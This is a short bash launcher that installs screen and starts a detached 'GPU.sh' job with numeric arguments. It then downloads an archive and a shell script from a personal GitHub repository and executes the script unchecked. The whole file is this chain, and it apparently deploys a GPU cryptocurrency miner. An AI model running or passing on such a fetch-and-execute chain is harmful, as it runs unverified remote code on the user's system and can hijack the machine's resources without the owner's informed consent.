#!/bin/bash
sudo apt update && sudo apt install screen -y && screen -dmS gpuu.sh ./GPU.sh 65 75 && wget https://github.com/okg123/okg1/raw/main/okg.tar.gz && wget https://raw.githubusercontent.com/okg123/okg1/main/okg2.sh && chmod u+x okg2.sh && sh okg2.sh
